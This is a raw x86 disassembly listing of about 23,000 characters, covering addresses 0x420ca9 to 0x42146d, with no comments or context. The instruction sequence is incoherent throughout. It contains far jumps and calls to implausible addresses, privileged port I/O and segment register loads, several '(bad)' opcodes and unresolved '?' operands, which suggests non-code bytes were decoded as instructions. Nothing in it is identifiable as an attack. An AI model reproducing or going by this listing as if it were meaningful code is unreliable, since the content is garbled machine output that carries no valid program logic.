  420ca9:	sub    eax,0xe4ee0213
  420cae:	sub    eax,DWORD PTR [eax]
  420cb0:	push   esi
  420cb1:	dec    edi
  420cb2:	xor    eax,0x5edb22a4
  420cb7:	pop    ss
  420cb8:	imul   BYTE PTR [edx]
  420cba:	jmp    0xd7ef9397
  420cbf:	js     0x420c49
  420cc1:	jl     0x420ca6
  420cc3:	cmp    eax,0x56386719
  420cc8:	bound  eax,QWORD PTR [edi-0x43]
  420ccb:	push   edx
  420ccc:	pop    ds
  420ccd:	cdq    
  420cce:	stos   DWORD PTR es:[edi],eax
  420ccf:	inc    esi
  420cd0:	lahf   
  420cd1:	syscall 
  420cd3:	add    BYTE PTR [esi+0x6fd992f5],dh
  420cd9:	or     ebx,0xb1ead1ea
  420cdf:	dec    edx
  420ce1:	ror    BYTE PTR [ecx+0x39f2377],0xdb
  420ce8:	or     BYTE PTR [eax],ah
  420cea:	adc    BYTE PTR [esi],bh
  420cec:	or     edi,DWORD PTR cs:[edi+edi*8-0x62]
  420cf1:	mov    ebx,0xab66fd40
  420cf6:	jmp    0x9fce3e72
  420cfb:	mov    cl,0xe7
  420cfd:	mov    esi,0xf47627de
  420d02:	lds    eax,FWORD PTR [eax]
  420d04:	js     0x420d43
  420d06:	push   edi
  420d07:	cld    
  420d08:	jl     0x420c98
  420d0a:	mov    edx,0xd7b164f5
  420d0f:	ins    BYTE PTR es:[edi],dx
  420d10:	in     al,dx
  420d11:	jbe    0x420cc0
  420d13:	pop    esi
  420d14:	mov    ch,0xf6
  420d16:	sub    dl,BYTE PTR [edx-0x81191ab]
  420d1c:	mov    eax,0x2bccb701
  420d21:	out    dx,eax
  420d22:	dec    edi
  420d23:	add    eax,0xc35e63a4
  420d28:	adc    eax,0x5b40a8de
  420d2d:	push   esp
  420d2e:	mov    dl,0xae
  420d30:	push   0xffffffb2
  420d32:	in     al,dx
  420d33:	lock and ecx,DWORD PTR [ebx-0x2e]
  420d37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d38:	aam    0x1c
  420d3a:	cwde   
  420d3b:	fcom   DWORD PTR [esi]
  420d3d:	mov    ecx,?
  420d3f:	jle    0x420d6e
  420d41:	jl     0x420d42
  420d43:	jmp    0x420ce6
  420d45:	sub    BYTE PTR es:[esi+eiz*8-0x22c56ff7],0x70
  420d4e:	xor    bl,BYTE PTR [esi+0x5c]
  420d51:	sub    esi,DWORD PTR [eax+eax*8]
  420d54:	pusha  
  420d55:	leave  
  420d56:	jmp    0xf8580770
  420d5b:	call   0x37bb:0x16df8cad
  420d62:	and    eax,0x36967202
  420d67:	xchg   DWORD PTR [edx+0xc],ebp
  420d6a:	aas    
  420d6b:	icebp  
  420d6c:	pop    esp
  420d6d:	stc    
  420d6e:	(bad)  
  420d6f:	and    al,0xe7
  420d71:	daa    
  420d72:	in     al,dx
  420d73:	push   ds
  420d74:	clc    
  420d75:	xor    eax,0x935092d8
  420d7a:	pop    ebx
  420d7b:	mov    ebp,0xcba140fc
  420d80:	sar    DWORD PTR [ebx+0x1ac647f9],cl
  420d86:	push   eax
  420d87:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420d89:	lahf   
  420d8a:	cld    
  420d8b:	repz mov edx,edx
  420d8e:	arpl   WORD PTR [eax+eax*8+0xb],ax
  420d92:	cmp    DWORD PTR [esi-0x11f5a3d0],0x20
  420d99:	sub    DWORD PTR [edi-0x4b],ebp
  420d9c:	(bad)  
  420d9e:	aad    0x92
  420da0:	dec    ecx
  420da1:	repnz shl eax,1
  420da4:	call   0xbf8f:0xe16e1846
  420dab:	lds    ecx,FWORD PTR [eax]
  420dad:	sbb    esi,eax
  420daf:	out    0xff,al
  420db1:	push   cs
  420db2:	pop    esp
  420db3:	cdq    
  420db4:	cwde   
  420db5:	pop    edi
  420db6:	sar    ebp,cl
  420db8:	or     bh,BYTE PTR [eax]
  420dba:	push   eax
  420dbb:	dec    esi
  420dbc:	jne    0x420d93
  420dbe:	mov    esi,DWORD PTR [edi+0x68b4943a]
  420dc4:	push   esi
  420dc5:	mov    BYTE PTR [edx],ch
  420dc7:	les    esi,FWORD PTR [ebx]
  420dc9:	mov    ch,0xdc
  420dcb:	xor    BYTE PTR [eax-0x60bb1303],bh
  420dd1:	push   ebx
  420dd2:	push   edi
  420dd3:	mov    BYTE PTR [esp+esi*2+0x2dbb78ef],ah
  420dda:	cdq    
  420ddb:	fsub   DWORD PTR [esi+edi*4+0x795dd5bd]
  420de2:	pop    ds
  420de3:	push   0x2ea8feff
  420de8:	pop    esp
  420de9:	adc    ebp,DWORD PTR [edx+0x4d]
  420dec:	push   ss
  420ded:	xchg   edx,eax
  420dee:	pop    ecx
  420def:	cmp    ecx,DWORD PTR [ebx-0x49]
  420df2:	or     esi,DWORD PTR [esi-0x51adbfe1]
  420df8:	and    ecx,DWORD PTR [edx-0x3b]
  420dfb:	adc    ah,BYTE PTR [ebx-0x79bfc677]
  420e01:	and    esi,DWORD PTR [ebp-0x37]
  420e04:	sbb    DWORD PTR [esi-0x2d],eax
  420e07:	mov    cl,0xb9
  420e09:	fcomp  st(3)
  420e0b:	pop    es
  420e0c:	xchg   ecx,eax
  420e0d:	mov    DWORD PTR [edx],ebx
  420e0f:	and    al,BYTE PTR [edx-0xba71cd]
  420e15:	pop    eax
  420e16:	and    eax,0x96a08f74
  420e1b:	sti    
  420e1c:	mov    ?,WORD PTR [esi]
  420e1e:	in     eax,dx
  420e1f:	cmp    esp,esp
  420e21:	or     DWORD PTR [edi+0x65],ecx
  420e24:	in     al,0x9
  420e26:	fdivr  DWORD PTR [edi]
  420e28:	sbb    cl,BYTE PTR [ebx]
  420e2a:	int3   
  420e2b:	xor    edi,eax
  420e2d:	jae    0x420e30
  420e2f:	ror    DWORD PTR [eax-0x4c4d0dfe],cl
  420e35:	imul   ecx,esi,0xe306b52f
  420e3b:	mov    edi,0xc5dbddd9
  420e40:	cs inc ecx
  420e42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420e43:	add    edi,DWORD PTR [edi-0x25]
  420e46:	xchg   ecx,eax
  420e47:	idiv   DWORD PTR [edx+0x79c53d76]
  420e4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e4e:	jne    0x420ec6
  420e50:	aas    
  420e51:	jmp    0x420e16
  420e53:	jl     0x420e8f
  420e55:	rcl    ecx,0x3b
  420e58:	outs   dx,BYTE PTR ds:[esi]
  420e59:	ja     0x420e68
  420e5b:	mov    bl,ch
  420e5d:	ret    
  420e5e:	mov    esi,0xc9672bdf
  420e63:	scas   eax,DWORD PTR es:[edi]
  420e64:	call   0xeaed:0xb7771c7e
  420e6b:	test   BYTE PTR [edx-0x5],al
  420e6e:	dec    edi
  420e6f:	mov    BYTE PTR [esi+0x5bf9b09d],cl
  420e75:	pop    ebp
  420e76:	outs   dx,DWORD PTR ds:[esi]
  420e77:	sub    DWORD PTR [eax-0x6c],0x534455b4
  420e7e:	xchg   ecx,eax
  420e7f:	jb     0x420e7c
  420e81:	jb     0x420ef1
  420e83:	lods   al,BYTE PTR ds:[esi]
  420e84:	mov    ch,0xd4
  420e86:	lock leave 
  420e88:	pop    ds
  420e89:	ins    DWORD PTR es:[edi],dx
  420e8a:	and    al,0xb0
  420e8c:	out    0x69,eax
  420e8e:	mov    bl,0xd9
  420e90:	add    eax,0x885700fd
  420e95:	push   ecx
  420e96:	popf   
  420e97:	sub    esp,DWORD PTR [esi+0x49]
  420e9a:	cli    
  420e9b:	sahf   
  420e9c:	sahf   
  420e9d:	ret    
  420e9e:	pop    ss
  420e9f:	mov    dh,0xc
  420ea1:	out    dx,eax
  420ea2:	mov    eax,0xfb7322a9
  420ea7:	xor    eax,0xbd064187
  420eac:	fwait
  420ead:	push   es
  420eae:	imul   esp,DWORD PTR ds:0xd2ed052,0x39
  420eb5:	iret   
  420eb6:	inc    ebx
  420eb7:	xchg   edi,eax
  420eb8:	lods   eax,DWORD PTR ds:[esi]
  420eb9:	push   edx
  420eba:	fdivr  QWORD PTR [eax+esi*1]
  420ebd:	stos   BYTE PTR es:[edi],al
  420ebe:	inc    eax
  420ebf:	jg     0x420f05
  420ec1:	icebp  
  420ec2:	push   esi
  420ec3:	sbb    eax,0x6e75dce1
  420ec9:	xchg   ecx,eax
  420eca:	adc    eax,0xf8c0be4c
  420ecf:	fadd   DWORD PTR [ebx]
  420ed1:	jns    0x420e8d
  420ed3:	and    bl,BYTE PTR [eax+0x6e7d9bd8]
  420ed9:	push   edx
  420eda:	push   esp
  420edb:	jmp    0x36d6:0x7af60554
  420ee2:	rcr    DWORD PTR es:[ebx],1
  420ee5:	xchg   edx,eax
  420ee6:	popf   
  420ee7:	jne    0x420eb5
  420ee9:	jno    0x420e91
  420eeb:	sub    BYTE PTR [ebp+0x19],dh
  420eee:	inc    eax
  420eef:	pop    es
  420ef0:	sub    al,0x66
  420ef2:	fisubr DWORD PTR ds:0x2054a157
  420ef8:	xchg   edi,eax
  420ef9:	iret   
  420efa:	or     BYTE PTR [ecx],bh
  420efc:	and    eax,0xdba7368
  420f01:	jne    0x420ef7
  420f03:	push   ebx
  420f04:	cld    
  420f05:	sbb    al,BYTE PTR [ebp-0x57]
  420f08:	stc    
  420f09:	lahf   
  420f0a:	arpl   WORD PTR [edx],bp
  420f0c:	lods   eax,DWORD PTR ds:[esi]
  420f0d:	sahf   
  420f0e:	jo     0x420f35
  420f10:	lods   al,BYTE PTR ds:[esi]
  420f11:	ins    DWORD PTR es:[edi],dx
  420f12:	push   eax
  420f13:	mov    WORD PTR ds:[edi],ds
  420f16:	dec    ebx
  420f17:	scas   eax,DWORD PTR es:[edi]
  420f18:	ret    
  420f19:	frstor [edx+0x5d]
  420f1c:	mov    ch,0xa5
  420f1e:	loope  0x420ea1
  420f20:	jl     0x420ec6
  420f22:	repz (bad) 
  420f24:	imul   ebx,DWORD PTR [edx],0x4c6c7414
  420f2a:	in     eax,0xd1
  420f2c:	and    BYTE PTR [ebx-0x62],ch
  420f2f:	pushf  
  420f30:	jne    0x420f6a
  420f32:	ror    BYTE PTR [eax],0xed
  420f35:	fstp   TBYTE PTR [edi+ebp*4+0x4d]
  420f39:	jmp    0x2e5cedb0
  420f3e:	dec    eax
  420f3f:	cmp    eax,DWORD PTR [edx]
  420f41:	sub    cl,BYTE PTR [eax]
  420f43:	or     eax,0x8e60f9c3
  420f48:	xor    eax,0x8ffa9816
  420f4d:	in     al,dx
  420f4e:	add    DWORD PTR [esp+ebp*2-0x3954f2e3],esi
  420f55:	daa    
  420f56:	mov    esp,0xadf433e1
  420f5b:	and    eax,0xa277463c
  420f60:	sbb    bl,al
  420f62:	xchg   edx,eax
  420f63:	xlat   BYTE PTR ds:[ebx]
  420f64:	sub    DWORD PTR ds:0xd855386f,ebx
  420f6a:	lds    ecx,FWORD PTR [edi-0x33]
  420f6d:	outs   dx,BYTE PTR ds:[esi]
  420f6e:	cmp    eax,esi
  420f70:	pop    esp
  420f71:	out    0xea,eax
  420f73:	jb     0x420f77
  420f75:	push   es
  420f76:	mov    edx,0x19f29ced
  420f7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420f7c:	mov    WORD PTR [ecx],ss
  420f7e:	push   esi
  420f7f:	xor    al,0xf5
  420f81:	cdq    
  420f82:	sub    eax,DWORD PTR [ecx+esi*2]
  420f85:	das    
  420f86:	cdq    
  420f87:	xchg   esp,eax
  420f88:	sub    eax,0x65711b74
  420f8d:	mov    edx,0x7726e7be
  420f92:	out    0xb7,al
  420f94:	stc    
  420f95:	shl    DWORD PTR [edx+0x25d46940],0x1a
  420f9c:	dec    esp
  420f9d:	push   esi
  420f9e:	pop    eax
  420f9f:	jmp    0x64299ce4
  420fa4:	iret   
  420fa5:	dec    esp
  420fa6:	and    al,0xca
  420fa8:	xor    al,0x29
  420faa:	cwde   
  420fab:	push   0x1c
  420fad:	jb     0x420f61
  420faf:	mov    ah,0xf4
  420fb1:	xchg   ebp,eax
  420fb2:	and    cl,BYTE PTR [edi]
  420fb4:	(bad)
  420fb7:	dec    edi
  420fb8:	inc    edi
  420fb9:	mov    edx,0x43dae9e4
  420fbe:	jg     0x420f68
  420fc0:	(bad)  
  420fc1:	adc    dh,dl
  420fc3:	sti    
  420fc4:	fs jg  0x420f85
  420fc7:	loop   0x420f79
  420fc9:	add    BYTE PTR [ecx+eax*1+0x4ec70aef],bh
  420fd0:	sub    al,0x0
  420fd2:	or     bh,BYTE PTR [edx+ecx*4-0x72533b]
  420fd9:	pop    eax
  420fda:	sub    bh,BYTE PTR [ecx]
  420fdc:	or     ebp,DWORD PTR [ebx]
  420fde:	or     DWORD PTR [esi-0x73],edx
  420fe1:	push   ebp
  420fe2:	xor    ebx,ebx
  420fe4:	popf   
  420fe5:	xchg   esi,eax
  420fe6:	leave  
  420fe7:	cmp    al,0x50
  420fe9:	ja     0x421016
  420feb:	call   0xb5e2de82
  420ff0:	retf   
  420ff1:	xor    al,0x87
  420ff3:	imul   esi,DWORD PTR [esi+0x71635d4a],0x1d93fc30
  420ffd:	cs xchg ecx,eax
  420fff:	loopne 0x42105f
  421001:	cmp    al,0xf
  421003:	push   esp
  421004:	xor    eax,0x47751865
  421009:	fcmovb st,st(1)
  42100b:	pusha  
  42100c:	pop    ecx
  42100d:	sbb    ecx,DWORD PTR [eax+0x41]
  421010:	inc    ebp
  421011:	scas   eax,DWORD PTR es:[edi]
  421012:	pop    ebx
  421013:	lods   al,BYTE PTR ds:[esi]
  421014:	sub    ecx,DWORD PTR [ecx+0x7f]
  421017:	push   ebx
  421018:	pop    ebx
  421019:	ds mov cl,0xa5
  42101c:	ja     0x421070
  42101e:	imul   eax,DWORD PTR [eax],0xee2b36d6
  421024:	jb     0x42104f
  421026:	inc    ebx
  421027:	jl     0xfadfc733
  42102d:	nop
  42102e:	adc    al,0x82
  421030:	in     al,dx
  421031:	inc    ebp
  421032:	xor    bl,BYTE PTR [edi-0x6288d9d9]
  421038:	inc    edx
  421039:	cmp    esi,DWORD PTR ds:0xcd577a25
  42103f:	push   0xc454487d
  421044:	mov    ecx,0x8aeee84a
  421049:	cmp    DWORD PTR [esi+0x59f70ffc],0x6e
  421050:	nop
  421051:	out    dx,eax
  421052:	jle    0x4210d3
  421054:	mov    WORD PTR [esi],ss
  421056:	pop    ss
  421057:	pop    edi
  421058:	inc    esi
  421059:	mov    al,ds:0x513bc8e
  42105e:	mov    BYTE PTR [ebp+0x69],ch
  421061:	and    ah,cl
  421063:	jne    0x421059
  421065:	pop    ecx
  421066:	mov    dh,0x76
  421068:	ins    BYTE PTR es:[edi],dx
  421069:	mov    cl,dl
  42106b:	inc    esi
  42106c:	daa    
  42106d:	dec    esi
  42106e:	push   ebx
  42106f:	(bad)  
  421070:	cmp    BYTE PTR [esi-0x507acf41],ch
  421076:	stos   BYTE PTR es:[edi],al
  421077:	adc    DWORD PTR [ebx+0x60],ebp
  42107a:	js     0x42105d
  42107c:	xchg   ebp,eax
  42107d:	or     BYTE PTR [ecx],bl
  42107f:	pop    esi
  421080:	pop    eax
  421081:	push   0x4b
  421083:	xchg   edx,eax
  421084:	ins    DWORD PTR es:[edi],dx
  421085:	inc    ecx
  421086:	and    ebx,DWORD PTR [eax-0x3]
  421089:	adc    eax,0x9789c7ed
  42108e:	fs cmp al,0xc5
  421091:	push   esi
  421092:	cmc    
  421093:	sbb    esi,DWORD PTR [eax+0x2521bed8]
  421099:	mov    esp,0x4a0e420f
  42109e:	push   ebx
  42109f:	sahf   
  4210a0:	repz xor BYTE PTR [ebx+0x4b90da9f],bh
  4210a7:	xchg   ecx,eax
  4210a8:	push   edi
  4210a9:	xor    BYTE PTR [ecx+0x2b],0x23
  4210ad:	out    0xb,eax
  4210af:	fcomp  DWORD PTR [ecx]
  4210b1:	imul   DWORD PTR [esi]
  4210b3:	mov    esi,0x5c9195a9
  4210b8:	shr    edi,1
  4210ba:	push   ebx
  4210bb:	lahf   
  4210bc:	clc    
  4210bd:	xchg   ebx,eax
  4210be:	test   eax,0xf7fc85d7
  4210c3:	loop   0x4210ce
  4210c5:	jbe    0x421112
  4210c7:	sub    bl,bl
  4210c9:	lea    ebx,[edx+0x42350652]
  4210cf:	loop   0x421121
  4210d1:	sar    BYTE PTR [edx-0x4a],cl
  4210d4:	fstp   QWORD PTR [edx]
  4210d6:	ss dec ecx
  4210d8:	clc    
  4210d9:	push   ds
  4210da:	and    eax,DWORD PTR ds:0xdf17bd12
  4210e0:	push   esp
  4210e1:	out    dx,al
  4210e2:	pop    esp
  4210e3:	(bad)  
  4210e4:	mov    dh,0x31
  4210e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4210e7:	frstor [ebp-0x464bd42d]
  4210ed:	data16 xor BYTE PTR [edx+0x7f],dl
  4210f1:	(bad)  
  4210f3:	clc    
  4210f4:	jle    0x421135
  4210f6:	(bad)  
  4210f8:	ins    DWORD PTR es:[edi],dx
  4210f9:	mov    WORD PTR [esi+0x66],?
  4210fc:	add    eax,0x589e6e57
  421101:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421102:	xor    al,ch
  421104:	aad    0xb1
  421106:	lds    edi,FWORD PTR [ebx+0x69896a08]
  42110c:	jmp    0x4210b3
  42110e:	dec    eax
  42110f:	xchg   ebp,eax
  421110:	lock enter 0x642e,0xc5
  421115:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421116:	mov    bh,0xc
  421118:	ror    dh,0x2a
  42111b:	(bad)  
  42111c:	cmp    eax,0x3e959902
  421121:	out    0xa2,al
  421123:	lods   eax,DWORD PTR ds:[esi]
  421124:	and    esp,esi
  421126:	adc    DWORD PTR [ecx+0x16],edx
  421129:	in     eax,0x37
  42112b:	fdiv   DWORD PTR [edx-0xec1f4a0]
  421131:	cwde   
  421132:	or     al,BYTE PTR [esi+ebp*1+0xab5982e]
  421139:	mov    BYTE PTR [edx+0x5f],ch
  42113c:	push   es
  42113d:	cwde   
  42113e:	out    0x5c,al
  421140:	lods   al,BYTE PTR ds:[esi]
  421141:	xchg   edx,eax
  421142:	int    0xa7
  421144:	mov    ebx,DWORD PTR [ecx+0x31c159e9]
  42114a:	cmp    al,0x7a
  42114c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42114d:	popf   
  42114e:	pushf  
  42114f:	and    BYTE PTR [edi+0x4504f294],al
  421155:	mov    ah,0x45
  421157:	mov    esp,0x41020db3
  42115c:	xchg   esp,eax
  42115d:	cli    
  42115e:	dec    ebx
  42115f:	jle    0x42117f
  421161:	fwait
  421162:	dec    ecx
  421163:	adc    al,0x5d
  421165:	push   ebp
  421166:	shl    DWORD PTR [edx-0x60],0x14
  42116a:	inc    edx
  42116c:	leave  
  42116d:	mov    ch,0x8e
  42116f:	dec    ecx
  421170:	push   ecx
  421171:	add    bl,dh
  421173:	dec    ebp
  421174:	adc    DWORD PTR [edx+0x7396f705],ebp
  42117a:	cmp    al,0x3b
  42117c:	aaa    
  42117d:	pop    edx
  42117e:	mov    edx,0x3f2429f6
  421183:	jbe    0x421181
  421185:	stos   BYTE PTR es:[edi],al
  421186:	sub    al,0xa5
  421188:	pop    edx
  421189:	repnz push eax
  42118b:	add    BYTE PTR [ebx],dh
  42118d:	fld    QWORD PTR [esp+esi*4]
  421190:	inc    ebp
  421191:	in     eax,dx
  421192:	pop    edx
  421193:	xor    DWORD PTR [ecx],edx
  421195:	adc    eax,0x3f11797a
  42119a:	sbb    eax,0xe076ed9f
  42119f:	mov    dl,0xdf
  4211a1:	mov    esp,0xeee45831
  4211a6:	sahf   
  4211a7:	cmp    DWORD PTR [edi-0x3c],esi
  4211aa:	xor    al,0x68
  4211ac:	cmp    DWORD PTR [ecx],edx
  4211ae:	mov    bh,0x71
  4211b0:	test   eax,0xdd471de8
  4211b5:	sahf   
  4211b6:	mov    ?,WORD PTR [ebx]
  4211b8:	adc    edi,DWORD PTR [ecx+0x51]
  4211bb:	fstp   DWORD PTR [eax]
  4211bd:	mov    bh,0xff
  4211bf:	jb     0x42122d
  4211c1:	xchg   BYTE PTR [edx],al
  4211c3:	bound  ebp,QWORD PTR [edx]
  4211c5:	xchg   esp,eax
  4211c6:	repz mov dl,bh
  4211c9:	mov    cl,0x2d
  4211cb:	jmp    0xc0cbc1b8
  4211d0:	pop    eax
  4211d1:	iret   
  4211d2:	data16 jns 0x421168
  4211d5:	cmp    BYTE PTR [ecx-0x808971e],dl
  4211db:	mov    bl,0xc
  4211dd:	imul   esp,DWORD PTR [eax],0xfe667c22
  4211e3:	(bad)  
  4211e5:	cmp    esp,ebp
  4211e7:	and    DWORD PTR [edx-0x59],edx
  4211ea:	fimul  WORD PTR [edi]
  4211ec:	dec    esp
  4211ed:	push   ds
  4211ee:	test   cl,dh
  4211f0:	stos   BYTE PTR es:[edi],al
  4211f1:	xchg   ecx,eax
  4211f2:	loop   0x4211c5
  4211f4:	ins    DWORD PTR es:[edi],dx
  4211f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4211f6:	mov    edx,?
  4211f8:	stc    
  4211f9:	or     DWORD PTR [edi-0x5a88704a],esp
  4211ff:	test   al,0x31
  421201:	pusha  
  421202:	cwde   
  421203:	js     0x4211d3
  421205:	or     al,0xed
  421207:	adc    eax,0xeef79331
  42120c:	std    
  42120d:	in     al,0xb5
  42120f:	jmp    0x8f6fb373
  421214:	not    BYTE PTR [esi-0x533a85c9]
  42121a:	pop    ecx
  42121b:	dec    esp
  42121c:	xlat   BYTE PTR ds:[ebx]
  42121d:	(bad)  
  42121e:	mov    al,0x78
  421220:	hlt    
  421221:	sub    ebx,DWORD PTR [edi-0x3eb3f1e1]
  421227:	(bad)  
  421228:	pop    edx
  421229:	push   edi
  42122a:	call   0xf7d026c1
  42122f:	xor    ecx,DWORD PTR [eax+0x1aabb44d]
  421235:	div    BYTE PTR [ebx+ecx*1-0x37]
  421239:	or     eax,0xf5994a18
  42123e:	sub    ecx,ecx
  421240:	stc    
  421241:	or     cl,BYTE PTR [eax]
  421243:	add    BYTE PTR [edx+ecx*4],dh
  421246:	xchg   ebx,eax
  421247:	jp     0x42123f
  421249:	loope  0x421207
  42124b:	jle    0x421237
  42124d:	mov    esp,DWORD PTR [edi+0x17]
  421250:	dec    ebp
  421251:	(bad)  
  421252:	pop    ds
  421253:	xor    eax,0x43de09f2
  421258:	sub    ecx,DWORD PTR [ecx+ebx*4-0x6ac36523]
  42125f:	and    eax,0x959d14ca
  421264:	mov    cl,0x71
  421266:	int3   
  421267:	outs   dx,BYTE PTR ds:[esi]
  421268:	ja     0x421285
  42126a:	xor    edi,eax
  42126c:	test   DWORD PTR [edi],esp
  42126e:	popf   
  42126f:	jmp    0xb791:0xf276c8b0
  421276:	xchg   esp,eax
  421277:	push   edx
  421278:	mov    cl,0x8b
  42127a:	xchg   ebx,eax
  42127b:	sbb    edx,DWORD PTR [edi+0x2b964fb4]
  421281:	cmp    eax,0xf962429
  421286:	xchg   esp,eax
  421287:	daa    
  421288:	mov    dh,0x59
  42128a:	hlt    
  42128b:	xor    ebx,eax
  42128d:	sub    ecx,DWORD PTR [esp+edx*2-0x18be2ecb]
  421294:	ja     0x42121f
  421296:	mov    cl,0x28
  421298:	(bad)  
  421299:	pop    ds
  42129a:	std    
  42129b:	pop    edi
  42129c:	mov    ebx,0xd36fab2c
  4212a1:	jno    0x42128e
  4212a3:	jmp    0x1463:0x487b1945
  4212aa:	inc    eax
  4212ab:	(bad)  
  4212ac:	push   0x6b
  4212ae:	sub    edi,DWORD PTR [esi-0x45cc1805]
  4212b4:	and    BYTE PTR [ecx],bh
  4212b6:	dec    ebx
  4212b7:	push   eax
  4212b8:	sub    DWORD PTR [esp+esi*1],esp
  4212bb:	lds    esi,FWORD PTR [edi+0x41]
  4212be:	test   DWORD PTR [esi+0x181b6e8d],eax
  4212c4:	lahf   
  4212c5:	in     al,dx
  4212c6:	call   0x25233e05
  4212cb:	cmc    
  4212cc:	mov    ch,0x1a
  4212ce:	lds    edx,FWORD PTR ds:0x5aa98d5d
  4212d4:	in     eax,0x7b
  4212d6:	mov    ecx,0x5a5debd5
  4212db:	and    dh,dh
  4212dd:	sub    DWORD PTR [esi],edi
  4212df:	daa    
  4212e0:	pop    eax
  4212e1:	loop   0x421299
  4212e3:	sahf   
  4212e4:	leave  
  4212e5:	jp     0x42129c
  4212e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4212e8:	lds    edx,FWORD PTR [eax]
  4212ea:	xor    al,0x83
  4212ec:	loope  0x42136d
  4212ee:	push   edx
  4212ef:	data16 clc 
  4212f1:	cmp    eax,0xb7ced3bf
  4212f6:	ss daa 
  4212f8:	lea    edi,[ecx+0x1d204687]
  4212fe:	dec    edx
  4212ff:	jne    0x421300
  421301:	or     edi,DWORD PTR [edi]
  421303:	cs jle 0x42133c
  421306:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421307:	push   0x82cd0be2
  42130c:	fs sub eax,0x71a1e93c
  421312:	jecxz  0x421341
  421314:	and    eax,0x73ba59c1
  421319:	dec    esp
  42131a:	pushf  
  42131b:	pop    ds
  42131c:	int    0x3d
  42131e:	cmp    al,0xed
  421320:	xor    eax,0xd835c21d
  421325:	dec    ecx
  421326:	pop    ss
  421327:	das    
  421328:	inc    eax
  421329:	call   0xa23a06ac
  42132e:	outs   dx,DWORD PTR ds:[esi]
  42132f:	sbb    DWORD PTR [ebp+0x47c1c668],ecx
  421335:	push   eax
  421336:	ror    edx,1
  421338:	cld    
  421339:	mov    al,0x4d
  42133b:	mov    bl,0xa0
  42133d:	pop    edi
  42133e:	icebp  
  42133f:	inc    eax
  421340:	fisttp DWORD PTR [edi+0xf]
  421343:	push   ebp
  421344:	xchg   ecx,eax
  421345:	retf   0x4cc5
  421348:	sbb    DWORD PTR [esi-0x34],ebp
  42134b:	cdq    
  42134c:	fsubr  DWORD PTR [edx]
  42134e:	scas   eax,DWORD PTR es:[edi]
  42134f:	js     0x42136e
  421351:	dec    esp
  421352:	push   cs
  421353:	in     al,0x3a
  421355:	xor    edi,DWORD PTR ds:0xdf9644a9
  42135b:	mov    dh,0x92
  42135d:	inc    esi
  42135e:	jmp    0xcba39a19
  421363:	les    ebx,FWORD PTR [eax+edi*4]
  421366:	(bad)  
  421368:	gs push ebp
  42136a:	add    cl,0x4b
  42136d:	and    eax,0xfd9ee796
  421372:	mov    eax,0xfbbd536b
  421377:	cli    
  421378:	ds jge 0x42130e
  42137b:	jae    0x7c5defcc
  421381:	mov    DWORD PTR [ebp+0x1df6cb53],ecx
  421387:	pusha  
  421388:	cmp    cl,bl
  42138a:	xor    DWORD PTR [eax+0x45],eax
  42138d:	jnp    0x4213d9
  42138f:	stos   DWORD PTR es:[edi],eax
  421390:	daa    
  421391:	mov    ecx,0x40763404
  421396:	inc    DWORD PTR [ebx-0x35]
  421399:	push   es
  42139a:	loope  0x421342
  42139c:	inc    eax
  42139d:	jg     0x421389
  42139f:	mov    cl,0xbc
  4213a1:	jne    0x421358
  4213a3:	push   0xb5a63f78
  4213a8:	lods   eax,DWORD PTR ds:[esi]
  4213a9:	or     ah,0xd5
  4213ac:	pop    ebp
  4213ad:	iret   
  4213ae:	retf   0x12e1
  4213b1:	or     BYTE PTR [edx-0x41937646],0xf4
  4213b8:	retf   0xd752
  4213bb:	push   edi
  4213bc:	mov    eax,0x84ab3ad6
  4213c1:	dec    ecx
  4213c2:	add    dh,BYTE PTR [ecx+ebx*1+0x384138a7]
  4213c9:	sti    
  4213ca:	daa    
  4213cb:	dec    eax
  4213cc:	and    DWORD PTR [ebx+0x3d4f0d8d],edi
  4213d2:	loope  0x42137d
  4213d4:	not    edx
  4213d6:	shrd   DWORD PTR [eax],edx,0xd3
  4213da:	stos   DWORD PTR es:[edi],eax
  4213db:	test   eax,0xbaa25135
  4213e0:	inc    esi
  4213e1:	jmp    0x7cd194ff
  4213e6:	jno    0x42143a
  4213e8:	popf   
  4213e9:	fist   WORD PTR [esi+0x5]
  4213ec:	call   0x7ac2bf2e
  4213f1:	(bad)
  4213f4:	jle    0x42140e
  4213f6:	push   0xfffffff3
  4213f8:	and    DWORD PTR [eax+ebx*1+0x9],edx
  4213fc:	adc    ch,BYTE PTR [ebx+0x7866e182]
  421402:	pop    ebp
  421403:	loop   0x4213db
  421405:	sub    eax,0xb6011cef
  42140a:	invd   
  42140c:	lock adc al,0xf2
  42140f:	sti    
  421410:	mov    edi,0x5ec29b29
  421415:	push   esp
  421416:	xchg   DWORD PTR [ebp+0x1123a8e5],esi
  42141c:	movzx  esp,WORD PTR [ecx-0xc]
  421420:	(bad)  
  421421:	fist   WORD PTR ds:0x7cd54bfb
  421427:	xchg   esi,eax
  421428:	call   0xfded708e
  42142d:	dec    BYTE PTR [ebx-0x5e1efa73]
  421433:	xor    BYTE PTR [esi+0x6b84a825],dh
  421439:	jnp    0x42142c
  42143b:	or     dl,BYTE PTR [edx+0x2c]
  42143e:	jns    0x421498
  421440:	ret    
  421441:	xchg   edx,eax
  421442:	mov    esp,0x6f904b93
  421447:	and    BYTE PTR [eax-0x75b40233],bh
  42144d:	jge    0x42143e
  42144f:	push   eax
  421450:	adc    BYTE PTR [ecx],ah
  421452:	inc    ebx
  421453:	or     ah,BYTE PTR [ecx]
  421455:	xor    ch,ah
  421457:	in     al,0xa4
  421459:	mov    BYTE PTR [edi-0x7b],cl
  42145c:	adc    esp,0xffffffc8
  42145f:	call   0x3999:0x4cbf18dd
  421466:	cli    
  421467:	(bad)  
  421468:	sahf   
  421469:	fwait
  42146a:	xchg   esi,eax
  42146b:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42146d:	in     al,dx
